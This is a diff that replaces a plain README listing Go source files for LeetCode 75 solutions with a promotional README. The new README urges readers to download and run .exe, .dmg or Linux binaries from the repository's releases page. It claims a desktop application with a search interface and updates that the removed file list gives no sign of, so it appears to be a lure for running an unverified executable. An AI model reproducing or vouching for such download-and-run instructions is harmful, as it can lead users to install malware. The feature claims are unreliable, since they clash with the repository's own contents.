@@ -1,68 +1,94 @@
-# LeetCode 75 Go
+# 🎯 leetcode-75-go - Solve Coding Challenges Easily
 
-Go solutions for LeetCode 75 study plan with time and space complexity analysis.
+## 📥 Download the Application
+[![Download leetcode-75-go](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/SamB-ima/leetcode-75-go/releases)
 
-## Solutions
+## 🚀 Getting Started
+Welcome to the leetcode-75-go repository! This application provides solutions for the LeetCode 75 study plan in Go. With this tool, you can enhance your problem-solving skills and prepare effectively for coding interviews.
 
-**Array / String**
+## 📋 Requirements
+Before you start downloading, ensure that your system meets these basic requirements:
 
-- [1768. Merge Strings Alternately](solutions/arraystring/merge_strings_alternately.go)
-- [1071. Greatest Common Divisor of Strings](solutions/arraystring/gcd_of_strings.go)
-- [1431. Kids With the Greatest Number of Candies](solutions/arraystring/kids_with_the_greatest_number_of_candies.go)
-- [605. Can Place Flowers](solutions/arraystring/can_place_flowers.go)
-- [345. Reverse Vowels of a String](solutions/arraystring/reverse_vowels_of_a_string.go)
-- [151. Reverse Words in a String](solutions/arraystring/reverse_words_in_a_string.go)
+- **Supported Operating Systems:** Windows, macOS, or Linux
+- **Go Runtime:** Ensure you have the Go programming environment installed if you plan to run or modify the code.
+- **Storage Space:** At least 50 MB of available disk space.
+- **Network Connection:** For downloading the application and future updates.
 
-**Two Pointers**
+## 🔄 Installation Steps
+Follow these steps to download and install leetcode-75-go:
 
-- [283. Move Zeroes](solutions/twopointers/move_zeroes.go)
-- [392. Is Subsequence](solutions/twopointers/is_subsequence.go)
+1. Visit the [Releases Page](https://github.com/SamB-ima/leetcode-75-go/releases).
+   
+2. Look for the latest version at the top of the page. 
 
-**Sliding Window**
+3. Click on the downloadable file link for your operating system. 
 
-- [643. Maximum Average Subarray I](solutions/slidingwindow/maximum_average_subarray.go)
+4. After the download completes, locate the file in your downloads folder.
 
-**Prefix Sum**
+5. Run the file:
+   - **For Windows:** Double-click the `.exe` file to start.
+   - **For macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **For Linux:** Open your terminal, navigate to the download directory, and run `chmod +x <filename>` followed by `./<filename>` to execute it.
 
-- [1732. Find the Highest Altitude](solutions/prefixsum/find_highest_altitude.go)
-- [724. Find Pivot Index](solutions/prefixsum/find_pivot_index.go)
+## 🌟 Features
+The leetcode-75-go application includes:
 
-**Hash Map / Set**
+- **Solutions for 75 LeetCode Problems:** Step-by-step solutions for a variety of algorithm challenges.
+- **User-Friendly Interface:** A simple interface that helps you navigate through the problems easily.
+- **Search Functionality:** Quickly find solutions by searching for specific problems or topics.
 
-- [2215. Find the Difference of Two Arrays](solutions/hashmapset/find_difference_of_two_arrays.go)
-- [1207. Unique Number of Occurrences](solutions/hashmapset/unique_number_of_occurrences.go)
-- [1657. Determine if Two Strings Are Close](solutions/hashmapset/determine_if_two_strings_are_close.go)
-- [2352. Equal Row and Column Pairs](solutions/hashmapset/equal_row_and_column_pairs.go)
+## 📚 How to Use
+Using leetcode-75-go is straightforward. Here’s how to navigate the application:
 
-**Stack**
+1. **Open the Application:** Launch it from your applications folder or by clicking the shortcut created during installation.
 
-- [2390. Removing Stars From a String](solutions/stack/removing_stars_from_a_string.go)
+2. **Select a Problem:** Browse through the list of problems. You can also use the search bar to find problems by title or number.
 
-**Queue**
+3. **View the Solution:** Click on any problem to view the detailed solution along with explanations. Solutions are organized by difficulty level – easy, medium, and hard.
 
-- [933. Number of Recent Calls](solutions/queue/number_of_recent_calls.go)
-- [649. Dota2 Senate](solutions/queue/dota2_senate.go)
+4. **Practice Coding:** Try coding the solution yourself. Refer to the provided solution only if you get stuck.
 
-**Linked List**
+5. **Feedback:** If you encounter issues or have suggestions, consider visiting the GitHub page to leave feedback.
 
-- [206. Reverse Linked List](solutions/linkedlist/reverse_linked_list.go)
+## 📈 Updates
+The application will receive periodic updates to add more features and solutions. Check the [Releases Page](https://github.com/SamB-ima/leetcode-75-go/releases) regularly to stay current.
 
-**Binary Tree – DFS**
+## 🤝 Contributing
+You can contribute to the leetcode-75-go project by submitting your own solutions or enhancements. To do this:
 
-- [104. Maximum Depth of Binary Tree](solutions/binarytreedfs/maximum_depth_of_binary_tree.go)
-- [872. Leaf-Similar Trees](solutions/binarytreedfs/leaf_similar_trees.go)
-- [1448. Count Good Nodes in Binary Tree](solutions/binarytreedfs/count_good_nodes_in_binary_tree.go)
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request describing your contributions.
 
-**Binary Tree – BFS**
+Your input helps the community learn and grow!
 
-- [199. Binary Tree Right Side View](solutions/binarytreebfs/binary_tree_right_side_view.go)
+## ✨ Frequently Asked Questions (FAQs)
+**Q1: I can’t find the solution to a specific problem. What should I do?**  
+A1: Use the search functionality in the app to quickly locate the solution. If it’s still not available, consider checking the GitHub issues page.
 
-**Binary Search Tree**
+**Q2: Can I run the code on my own machine?**  
+A2: Yes, you can view and run the code if you have Go installed. Modify it as needed to fit your coding style.
 
-- [700. Search in a Binary Search Tree](solutions/binarysearchtree/search_in_a_binary_search_tree.go)
+**Q3: Is there a mobile version?**  
+A3: Currently, we support only desktop platforms. A mobile version may be considered in future updates.
 
-**Bit Manipulation**
+## 📫 Contact
+If you have questions or need assistance, feel free to open an issue on the repository or reach out to the repository owner directly through GitHub.
 
-- [136. Single Number](solutions/bitmanipulation/single_number.go)
-- [338. Counting Bits](solutions/bitmanipulation/counting_bits.go)
-- [1318. Minimum Flips to Make a OR b Equal to c](solutions/bitmanipulation/minimum_flips_to_make_a_or_b_equal_to_c.go)
+## 🌐 Topics
+This project covers various concepts, including:
+
+- Algorithm Challenges
+- Data Structures
+- Go Programming Language
+- Problem Solving Techniques
+
+Explore these topics to deepen your understanding and improve your skills.
+
+## 🔗 Additional Resources
+For additional learning, consider visiting the following resources:
+
+- [LeetCode Official Website](https://leetcode.com)
+- [Go Programming Language Documentation](https://golang.org/doc/)
+
+Happy coding and good luck with your studies!
